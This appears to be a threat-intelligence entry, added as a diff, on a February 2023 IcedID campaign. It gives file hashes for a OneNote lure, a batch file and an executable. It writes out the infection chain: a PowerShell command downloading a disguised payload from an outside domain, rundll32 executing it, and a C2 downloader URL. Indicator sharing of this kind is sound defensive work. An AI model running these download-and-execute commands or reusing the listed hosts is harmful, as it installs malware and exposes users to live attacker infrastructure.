@@ -1,0 +1,24 @@
+IcedID | 21.02.2023 | Campaign 	3329953471
+
+***************************************
+
+.one 9c337d27dab65fc3f4b88666338e13416f218ab75c4b5e37cc396241c225efe8 - Contract_02_21_Copy#909.one 
+.bat 681217e6c8ed3ed37c1312646afb8e0cfe25e6840f461d10a7d9cdd4ffa725cb
+.exe 1ab812f7d829444dc703eeb02ea0a955ec839d5e2a9b619d44ac09a91135cad1
+
+***************************************
+
+Exec >>
+
+cmd.exe /c C:\Users\Admin\AppData\Local\Temp\O p e n.bat
+
+powershell invoke-webrequest -uri http://mrassociattes.com/images/62.gif -outfile c:\programdata\COIm.jpg
+
+rundll32 c:\programdata\COIm.jpg,init
+
+***************************************
+
+c2 downloader
+
+http://aerilaponawki.com/
+
